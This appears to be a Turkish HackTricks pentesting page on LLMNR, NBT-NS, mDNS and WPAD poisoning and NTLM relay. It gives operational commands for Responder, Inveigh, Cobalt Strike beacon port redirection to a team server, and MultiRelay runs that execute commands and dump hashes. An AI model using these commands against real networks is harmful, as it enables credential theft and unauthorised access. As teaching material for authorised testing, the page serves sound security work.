# LLMNR, NBT-NS, mDNS/DNS ve WPAD Sahteciliği ve İletim Saldırıları

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'da takip edin.
* Hacking hilelerinizi göndererek **HackTricks** ve **HackTricks Cloud** github depolarına **PR göndererek** paylaşın.

</details>

## Ağ Protokolleri

### Yerel Ana Bilgisayar Çözümleme Protokolleri
- **LLMNR, NBT-NS ve mDNS**:
- Microsoft ve diğer işletim sistemleri, DNS başarısız olduğunda yerel ad çözümlemesi için LLMNR ve NBT-NS kullanır. Benzer şekilde, Apple ve Linux sistemleri mDNS kullanır.
- Bu protokoller, kimlik doğrulama yapılmayan, UDP üzerinden yayın yapan doğası nedeniyle dinleme ve sahteciliğe karşı savunmasızdır.
- [Responder](https://github.com/lgandx/Responder), bu protokolleri sorgulayan ana bilgisayarlara sahte yanıtlar göndererek hizmetleri taklit etmek için kullanılabilir.
- Responder kullanarak hizmet taklit etme hakkında daha fazla bilgiye [buradan](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) ulaşabilirsiniz.

### Web Proxy Auto-Discovery Protocol (WPAD)
- WPAD, tarayıcıların proxy ayarlarını otomatik olarak keşfetmelerine olanak tanır.
- Keşif, DHCP, DNS veya DNS başarısız olursa LLMNR ve NBT-NS'ye geri düşme yoluyla kolaylaştırılır.
- Responder, WPAD saldırılarını otomatikleştirebilir ve istemcileri kötü niyetli WPAD sunucularına yönlendirebilir.

### Protokol Zehirleme için Responder
- **Responder**, LLMNR, NBT-NS ve mDNS sorgularını zehirlemek için kullanılan bir araçtır ve sorgu türlerine göre seçici yanıtlar vererek öncelikle SMB hizmetlerini hedef alır.
- Kali Linux'ta önceden yüklenmiş olarak gelir ve `/etc/responder/Responder.conf` dosyasından yapılandırılabilir.
- Responder, yakalanan karmaşaları ekranda görüntüler ve `/usr/share/responder/logs` dizininde kaydeder.
- IPv4 ve IPv6'yı destekler.
- Responder'ın Windows sürümü [burada](https://github.com/lgandx/Responder-Windows) bulunabilir.

#### Responder'ı Çalıştırma
- Varsayılan ayarlarla Responder'ı çalıştırmak için: `responder -I <Arayüz>`
- Daha agresif keşif için (potansiyel yan etkilerle): `responder -I <Arayüz> -P -r -v`
- NTLMv1 meydan okumalarını/yanıtlarını daha kolay kırabilmek için teknikler: `responder -I <Arayüz> --lm --disable-ess`
- WPAD taklitini etkinleştirmek için: `responder -I <Arayüz> --wpad`
- NetBIOS istekleri saldırganın IP'sine çözümlenebilir ve kimlik doğrulama proxy'si kurulabilir: `responder.py -I <arayüz> -Pv`

### Responder ile DHCP Zehirleme
- DHCP yanıtlarını sahtecilik yaparak bir kurbanın yönlendirme bilgilerini kalıcı olarak zehirleyebilir ve ARP zehirlemeye göre daha gizli bir alternatif sunar.
- Hedef ağın yapılandırması hakkında kesin bilgi gerektirir.
- Saldırıyı çalıştırma: `./Responder.py -I eth0 -Pdv`
- Bu yöntem, etkili bir şekilde NTLMv1/2 karmaşalarını yakalayabilir, ancak ağ kesintisini önlemek için dikkatli bir şekilde kullanılmalıdır.

### Responder ile Kimlik Bilgilerini Yakalama
- Responder, yukarıda bahsedilen protokolleri kullanarak hizmetleri taklit eder ve bir kullanıcı sahte hizmetlere kimlik doğrulama yapmaya çalıştığında kimlik bilgilerini (genellikle NTLMv2 Meydan Okuma/Yanıtı) yakalar.
- Kimlik bilgileri kırılması daha kolay olması için NetNTLMv1'e düşürme veya ESS'yi devre dışı bırakma girişimleri yapılabilir.

Bu tekniklerin yasal ve etik olarak kullanılması, uygun yetkilendirme sağlanması ve ağa zarar verme veya izinsiz erişimden kaçınılması önemlidir.

## Inveigh

Inveigh, Windows sistemler için tasarlanmış bir penetrasyon testi ve kırmızı takım aracıdır. Responder'a benzer işlevler sunar ve sahtecilik ve orta adam saldırıları gerçekleştirir. Araç, bir PowerShell komut dosyasından C# ikili bir dosyaya evrim geçirmiştir ve [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) ve [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) ana sürümleri bulunmaktadır. Ayrıntılı parametreler ve talimatlar [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)'de bulunabilir.

Inveigh, PowerShell aracılığıyla çalıştırılabilir:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Veya bir C# ikili olarak yürütülür:
```bash
Inveigh.exe
```
### NTLM Relay Saldırısı

Bu saldırı, bir hedef makineye erişmek için SMB kimlik doğrulama oturumlarını kullanır ve başarılı olması durumunda bir sistem kabuğu sağlar. Ana gereksinimler şunları içerir:
- Kimlik doğrulayan kullanıcının, iletilen ana bilgisayarda Yerel Yönetici erişimine sahip olması gerekmektedir.
- SMB imzalama devre dışı bırakılmalıdır.

#### 445 Port Yönlendirme ve Tünelleme

Doğrudan ağ tanıtımının mümkün olmadığı senaryolarda, 445 numaralı port üzerindeki trafiğin yönlendirilmesi ve tünellemesi gerekmektedir. [**PortBender**](https://github.com/praetorian-inc/PortBender) gibi araçlar, 445 numaralı port trafiğini başka bir porta yönlendirmede yardımcı olur ve yerel yönetici erişimi sürücü yükleme için mevcut olduğunda önemlidir.

Cobalt Strike'da PortBender kurulumu ve işletimi:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### NTLM Relay Saldırısı için Diğer Araçlar

- **Metasploit**: Proxy'ler, yerel ve uzak ana bilgisayar ayrıntılarıyla yapılandırılır.
- **smbrelayx**: SMB oturumlarını iletmek ve komutları yürütmek veya arka kapılar dağıtmak için Python betiği.
- **MultiRelay**: Belirli kullanıcıları veya tüm kullanıcıları iletmek, komutları yürütmek veya hash'leri dökmek için Responder paketinin bir aracı.

Her bir araç, gerektiğinde SOCKS proxy üzerinden çalışacak şekilde yapılandırılabilir, böylece dolaylı ağ erişimi ile bile saldırılar gerçekleştirilebilir.

### MultiRelay İşleyişi

MultiRelay, _**/usr/share/responder/tools**_ dizininden belirli IP'ler veya kullanıcılar hedef alınarak çalıştırılır.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Bu araçlar ve teknikler, çeşitli ağ ortamlarında NTLM Relay saldırıları gerçekleştirmek için kapsamlı bir set oluşturur.

### NTLM Oturumu Zorlama

Windows'ta, bazı ayrıcalıklı hesapları **keyfi makinelerde kimlik doğrulamaya zorlayabilirsiniz**. Nasıl yapılacağını öğrenmek için aşağıdaki sayfayı okuyun:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Referanslar
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>
